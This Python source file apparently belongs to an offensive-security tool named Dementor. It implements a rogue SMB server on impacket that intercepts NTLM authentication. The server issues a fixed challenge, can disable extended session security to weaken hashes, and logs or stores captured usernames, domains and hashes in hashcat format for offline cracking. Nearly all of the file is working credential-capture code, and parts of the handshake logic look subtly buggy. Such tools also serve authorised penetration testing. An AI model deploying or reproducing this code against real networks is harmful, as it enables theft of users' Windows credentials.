# Copyright (c) 2025 MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import random
import struct
import threading
import configparser
import socket

from impacket.smbserver import SMBSERVER, encodeSMBString
from impacket import smb, smb3, nt_errors, smb3structs as smb2, ntlm
from impacket.spnego import (
    SPNEGO_NegTokenInit,
    SPNEGO_NegTokenResp,
    TypesMech,
)

from dementor.config import TomlConfig, SessionConfig, get_value, _LOCAL
from dementor.logger import ProtocolLogger, dm_logger
from dementor.protocols.ntlm import (
    NTLM_AUTH_decode_string,
    NTLM_AUTH_to_hashcat_format,
    NTLM_AUTH_CreateChallenge,
)
from dementor.protocols.spnego import negTokenInit_step


class SMBServerConfig(TomlConfig):
    _section_ = "SMB"
    _fields_ = [
        ("smb_port", "Port", _LOCAL),
        ("smb_server_os", "ServerOS", "Windows"),
        ("smb_server_name", "ServerName", "DEMENTOR"),
        ("smb_server_domain", "ServerDomain", "WORKGROUP"),
        ("smb_error_code", "ErrorCode", nt_errors.STATUS_SMB_BAD_UID),
        ("smb2_support", "SMB2Support", True),
        ("smb_ess", "NTLM.ExtendedSessionSecurity", True),
        ("smb_challenge", "NTLM.Challenge", b"A" * 8),
    ]

    def set_smb_challenge(self, value: str | bytes):
        match value:
            case str():
                self.smb_challenge = value.encode("utf-8", errors="replace")
            case bytes():
                self.smb_challenge = value

    def set_smb_error_code(self, value: str | int):
        match value:
            case int():  # great
                self.smb_error_code = value
            case str():
                self.smb_error_code = getattr(nt_errors, value)


def apply_config(session: SessionConfig) -> None:
    if not session.smb_enabled:
        # don't try to parse the following values
        return

    ports = set()
    for server in get_value("SMB", "Server", default=[]):
        smb_config = SMBServerConfig(server)
        port = smb_config.smb_port
        if not port:
            dm_logger.warning("Configuration contains SMBServer without Port!")
            continue

        if port in ports:
            dm_logger.warning(
                f"Configuration defines two SMB servers with the same port({port})!"
            )
            continue

        session.smb_server_config.append(smb_config)
        ports.add(port)


def create_server_threads(session: SessionConfig) -> list:
    servers = []
    for smb_config in session.smb_server_config:
        try:
            servers.append(SMBServerThread(session, smb_config))
        except Exception as e:
            dm_logger.error(f"Failed to create SMB server: {e}")
    return servers


class SMBServerThread(threading.Thread):
    def __init__(
        self,
        config: SessionConfig,
        server_config: SMBServerConfig,
    ):
        super().__init__()
        self.config = config
        self.server_config = server_config
        self.logger = ProtocolLogger(
            {
                "protocol": "SMB",
                "protocol_color": "light_goldenrod1",
                "port": self.server_config.smb_port,
            }
        )

        # smbserver setup
        smb_config = configparser.ConfigParser()
        smb_config.add_section("global")
        smb_config.set("global", "server_name", self.server_config.smb_server_name)
        smb_config.set("global", "server_domain", self.server_config.smb_server_domain)
        smb_config.set("global", "server_os", self.server_config.smb_server_os)

        # Next, disable logging and creds
        smb_config.set("global", "log_file", "None")
        smb_config.set("global", "credentials_file", "")
        smb_config.set("global", "anonymous_logon", "False")

        # SMB2 support
        smb_config.set("global", "SMB2Support", str(self.server_config.smb2_support))

        # NTLM challenge
        if self.config.ntlm_challange:
            smb_config.set(
                "global",
                "challenge",
                self.server_config.smb_challenge.hex(),
            )

        # Missing IPC share configuration here to make clients
        # always disconnect

        # Change address_family to IPv6 if this is configured
        address = self.config.ipv4
        if self.config.ipv6:
            SMBSERVER.address_family = socket.AF_INET6
            # empty string means all interfaces even though IPv6 can be bound to a specific
            # interface. Unfortunately, impacket's SMBSERVER does not support binding to
            # specific IPv6 addresses.
            address = ""

        self.server = SMBSERVER(
            (address, self.server_config.smb_port),
            config_parser=smb_config,
        )
        self.server.processConfigFile()

        # hook session setup
        self.orig_smb2_session_setup = self.server.hookSmb2Command(
            smb3.SMB2_SESSION_SETUP,
            self.smb2SessionSetup,
        )
        self.orig_smb1_session_setup = self.server.hookSmbCommand(
            smb.SMB.SMB_COM_SESSION_SETUP_ANDX,
            self.smbComSessionSetupAndX,
        )

    def smb2SessionSetup(self, connId: dict, smbServer: SMBSERVER, recvPacket: dict):
        # copied and modified from SMB2Commands to be able to drop ESS support
        connData = smbServer.getConnectionData(connId, checkStatus=False)
        respSMBCommand = smb2.SMB2SessionSetup_Response()
        sessionSetupData = smb2.SMB2SessionSetup(recvPacket["Data"])
        connData["Capabilities"] = sessionSetupData["Capabilities"]

        securityBlob = sessionSetupData["Buffer"]

        rawNTLM = False
        match securityBlob[0]:
            case 0x60:  # ASN1_AID
                blob = SPNEGO_NegTokenInit(securityBlob)
                mech_type = blob["MechTypes"][0]
                if (
                    mech_type
                    == TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]
                ):
                    token = blob["MechToken"]
                else:
                    resp = negTokenInit_step(
                        0x02,  # reject
                        supportedMech="NTLMSSP - Microsoft NTLM Security Support Provider",
                    )
                    resp_data = resp.getData()
                    respSMBCommand["SecurityBufferOffset"] = 0x48
                    respSMBCommand["SecurityBufferLength"] = len(resp_data)
                    respSMBCommand["Buffer"] = resp_data
                    return [respSMBCommand], None, smb3.STATUS_MORE_PROCESSING_REQUIRED

            case 0xA1:  # ASN1_SUPPORTED_MECH
                blob = SPNEGO_NegTokenResp(securityBlob)
                token = blob["ResponseToken"]

            case _:  # raw
                rawNTLM = True
                token = securityBlob

        # Here we only handle NTLMSSP, depending on what stage of the
        # authentication we are, we act on it
        assert len(token) >= 12  # REMOVE THIS
        match struct.unpack("<L", token[8:12])[0]:
            case 0x01:
                # NEGOTIATE_MESSAGE
                negotiateMessage = ntlm.NTLMAuthNegotiate()
                negotiateMessage.fromString(token)
                connData["NEGOTIATE_MESSAGE"] = negotiateMessage
                # Let's build the answer flags
                challengeMessage = NTLM_AUTH_CreateChallenge(
                    negotiateMessage,
                    self.server_config.smb_server_name,
                    self.server_config.smb_server_domain,
                    self.server_config.smb_challenge,
                    disable_ess=not self.server_config.smb_ess,
                )

                if rawNTLM is False:
                    # accept-incomplete. We want more data
                    respToken = negTokenInit_step(
                        negResult=0x01,
                        supportedMech="NTLMSSP - Microsoft NTLM Security Support Provider",
                    )
                    respToken["ResponseToken"] = challengeMessage.getData()
                else:
                    respToken = challengeMessage

                # Setting the packet to STATUS_MORE_PROCESSING
                errorCode = smb3.STATUS_MORE_PROCESSING_REQUIRED
                connData["Uid"] = random.randint(1, 0xFFFFFFFF)
                connData["CHALLENGE_MESSAGE"] = challengeMessage

            case 0x02:
                # CHALLENGE_MESSAGE
                raise Exception("Challenge Message raise, not implemented!")

            case 0x03:
                # AUTHENTICATE_MESSAGE, here we deal with authentication
                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)
                connData["AUTHENTICATE_MESSAGE"] = authenticateMessage
                if (
                    not authenticateMessage["flags"] & ntlm.NTLMSSP_NEGOTIATE_ANONYMOUS
                    and authenticateMessage["user_name"]
                ):
                    hash_version, hash_string = NTLM_AUTH_to_hashcat_format(
                        self.config.ntlm_challange,
                        authenticateMessage["user_name"],
                        authenticateMessage["domain_name"],
                        authenticateMessage["lanman"],
                        authenticateMessage["ntlm"],
                        authenticateMessage["flags"],
                    )

                    flags = authenticateMessage["flags"]
                    host_name = NTLM_AUTH_decode_string(
                        authenticateMessage["host_name"], flags
                    )
                    user_name = NTLM_AUTH_decode_string(
                        authenticateMessage["user_name"], flags
                    )
                    domain_name = NTLM_AUTH_decode_string(
                        authenticateMessage["domain_name"], flags
                    )

                    self.logger.debug(
                        f"Completed NTLM AUTH flow for {domain_name}/{user_name} from {host_name}",
                    )
                    self.config.db.add_auth(
                        (connData["ClientIP"], self.server_config.smb_port),
                        credtype=hash_version,
                        password=hash_string,
                        logger=self.logger,
                        username=user_name,
                        domain=domain_name,
                        hostname=host_name,
                    )

                errorCode = self.server_config.smb_error_code
                respToken = negTokenInit_step(negResult=0x02)

            case messageType:
                raise Exception("Unknown NTLMSSP MessageType %d" % messageType)

        respSMBCommand["SecurityBufferOffset"] = 0x48
        respSMBCommand["SecurityBufferLength"] = len(respToken)
        respSMBCommand["Buffer"] = respToken.getData()

        connData["Authenticated"] = False
        smbServer.setConnectionData(connId, connData)
        return [respSMBCommand], None, errorCode

    def smbComSessionSetupAndX(
        self,
        connId: dict,
        smbServer: SMBSERVER,
        SMBCommand: dict,
        recvPacket: dict,
    ):
        # copied and modified from SMBCommands to be able to drop ESS support
        connData = smbServer.getConnectionData(connId, checkStatus=False)
        respSMBCommand = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)

        # From [MS-SMB]
        # When extended security is being used (see section 3.2.4.2.4), the
        # request MUST take the following form
        # [..]
        # WordCount (1 byte): The value of this field MUST be 0x0C.
        if SMBCommand["WordCount"] == 12:
            # Extended security. Here we deal with all SPNEGO stuff
            respParameters = smb.SMBSessionSetupAndX_Extended_Response_Parameters()
            respData = smb.SMBSessionSetupAndX_Extended_Response_Data(
                flags=recvPacket["Flags2"]
            )
            sessionSetupParameters = smb.SMBSessionSetupAndX_Extended_Parameters(
                SMBCommand["Parameters"]
            )
            sessionSetupData = smb.SMBSessionSetupAndX_Extended_Data()
            sessionSetupData["SecurityBlobLength"] = sessionSetupParameters[
                "SecurityBlobLength"
            ]
            sessionSetupData.fromString(SMBCommand["Data"])
            connData["Capabilities"] = sessionSetupParameters["Capabilities"]

            rawNTLM = False
            match sessionSetupData["SecurityBlob"]:
                case 0x60:  # ASN1_AID
                    # NEGOTIATE packet
                    blob = SPNEGO_NegTokenInit(sessionSetupData["SecurityBlob"])
                    mech_type = blob["MechTypes"][0]
                    if (
                        mech_type
                        == TypesMech[
                            "NTLMSSP - Microsoft NTLM Security Support Provider"
                        ]
                    ):
                        token = blob["MechToken"]
                    else:
                        resp = negTokenInit_step(
                            0x02,  # reject
                            supportedMech="NTLMSSP - Microsoft NTLM Security Support Provider",
                        )
                        resp_data = resp.getData()
                        respParameters["SecurityBlobLength"] = len(resp_data)
                        respData["SecurityBlobLength"] = respParameters[
                            "SecurityBlobLength"
                        ]
                        respData["SecurityBlob"] = resp_data
                        respData["NativeOS"] = encodeSMBString(
                            recvPacket["Flags2"], smbServer.getServerOS()
                        )
                        respData["NativeLanMan"] = encodeSMBString(
                            recvPacket["Flags2"], smbServer.getServerOS()
                        )
                        respSMBCommand["Parameters"] = respParameters
                        respSMBCommand["Data"] = respData
                        return (
                            [respSMBCommand],
                            None,
                            smb3.STATUS_MORE_PROCESSING_REQUIRED,
                        )

                case 0xA1:  # ASN1_SUPPORTED_MECH
                    # AUTH packet
                    blob = SPNEGO_NegTokenResp(sessionSetupData["SecurityBlob"])
                    token = blob["ResponseToken"]
                case _:
                    # No GSSAPI stuff, raw NTLMSSP
                    rawNTLM = True
                    token = sessionSetupData["SecurityBlob"]

            # Here we only handle NTLMSSP, depending on what stage of the
            # authentication we are, we act on it
            assert len(token) >= 12  # REMOVE THIS
            match struct.unpack("<L", token[8:12])[0]:
                case 0x01:
                    # NEGOTIATE_MESSAGE
                    negotiateMessage = ntlm.NTLMAuthNegotiate()
                    negotiateMessage.fromString(token)
                    connData["NEGOTIATE_MESSAGE"] = negotiateMessage
                    # Let's build the answer flags
                    challengeMessage = NTLM_AUTH_CreateChallenge(
                        negotiateMessage,
                        self.server_config.smb_server_name,
                        self.server_config.smb_server_domain,
                        self.server_config.smb_challenge,
                        disable_ess=not self.server_config.smb_ess,
                    )

                    if rawNTLM is False:
                        # accept-incomplete. We want more data
                        respToken = negTokenInit_step(
                            negResult=0x01,
                            supportedMech="NTLMSSP - Microsoft NTLM Security Support Provider",
                        )
                        respToken["ResponseToken"] = challengeMessage.getData()
                    else:
                        respToken = challengeMessage

                    # Setting the packet to STATUS_MORE_PROCESSING
                    errorCode = smb3.STATUS_MORE_PROCESSING_REQUIRED
                    connData["Uid"] = random.randint(1, 0xFFFFFFFF)
                    connData["CHALLENGE_MESSAGE"] = challengeMessage

                case 0x02:
                    # CHALLENGE_MESSAGE
                    raise Exception("Challenge Message raise, not implemented!")

                case 0x03:
                    # AUTHENTICATE_MESSAGE, here we deal with authentication
                    authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                    authenticateMessage.fromString(token)
                    connData["AUTHENTICATE_MESSAGE"] = authenticateMessage
                    if (
                        not authenticateMessage["flags"]
                        & ntlm.NTLMSSP_NEGOTIATE_ANONYMOUS
                    ):
                        hash_version, hash_string = NTLM_AUTH_to_hashcat_format(
                            self.config.ntlm_challange,
                            authenticateMessage["user_name"],
                            authenticateMessage["domain_name"],
                            authenticateMessage["lanman"],
                            authenticateMessage["ntlm"],
                            authenticateMessage["flags"],
                        )

                        flags = authenticateMessage["flags"]
                        host_name = NTLM_AUTH_decode_string(
                            authenticateMessage["host_name"], flags
                        )
                        user_name = NTLM_AUTH_decode_string(
                            authenticateMessage["user_name"], flags
                        )
                        domain_name = NTLM_AUTH_decode_string(
                            authenticateMessage["domain_name"], flags
                        )

                        self.logger.debug(
                            f"Completed NTLM AUTH flow for {domain_name}/{user_name} from {host_name}",
                        )
                        self.config.db.add_auth(
                            (connData["ClientIP"], self.server_config.smb_port),
                            credtype=hash_version,
                            password=hash_string,
                            logger=self.logger,
                            username=user_name,
                            domain=domain_name,
                            hostname=host_name,
                        )

                    errorCode = self.server_config.smb_error_code
                    respToken = negTokenInit_step(negResult=0x02)

                case messageType:
                    raise Exception("Unknown NTLMSSP MessageType %d" % messageType)

            respParameters["SecurityBlobLength"] = len(respToken)
            respData["SecurityBlobLength"] = respParameters["SecurityBlobLength"]
            respData["SecurityBlob"] = respToken.getData()

        else:
            # Process Standard Security
            respParameters = smb.SMBSessionSetupAndXResponse_Parameters()
            respData = smb.SMBSessionSetupAndXResponse_Data()
            sessionSetupParameters = smb.SMBSessionSetupAndX_Parameters(
                SMBCommand["Parameters"]
            )
            sessionSetupData = smb.SMBSessionSetupAndX_Data()
            sessionSetupData["AnsiPwdLength"] = sessionSetupParameters["AnsiPwdLength"]
            sessionSetupData["UnicodePwdLength"] = sessionSetupParameters[
                "UnicodePwdLength"
            ]
            sessionSetupData.fromString(SMBCommand["Data"])
            connData["Capabilities"] = sessionSetupParameters["Capabilities"]
            # Do the verification here, for just now we grant access
            # TODO: Manage more UIDs for the same session
            errorCode = self.server_config.smb_error_code
            connData["Uid"] = 10
            respParameters["Action"] = 0

            hversion, hstring = NTLM_AUTH_to_hashcat_format(
                b"",  # no challenge
                sessionSetupData["Account"],
                sessionSetupData["PrimaryDomain"],
                sessionSetupData["AnsiPwd"],
                sessionSetupData["UnicodePwd"],
                0,  # no flags, username and domain are already decoded
            )
            self.logger.highlight(
                f"{hversion} Username: {sessionSetupData['PrimaryDomain']}/{sessionSetupData['Account']}",
                host=connData["ClientIP"],
            )
            self.logger.highlight(
                f"{hversion} Hash: {hstring}",
                host=connData["ClientIP"],
            )

        respData["NativeOS"] = encodeSMBString(
            recvPacket["Flags2"], smbServer.getServerOS()
        )
        respData["NativeLanMan"] = encodeSMBString(
            recvPacket["Flags2"], smbServer.getServerOS()
        )
        respSMBCommand["Parameters"] = respParameters
        respSMBCommand["Data"] = respData

        # From now on, the client can ask for other commands
        connData["Authenticated"] = True
        smbServer.setConnectionData(connId, connData)

        return [respSMBCommand], None, errorCode

    def run(self):
        host, port, *_ = self.server.server_address
        self.logger.debug(f"Starting SMB server on {host}:{port}")
        self.server.daemon_threads = True
        self.server.serve_forever()
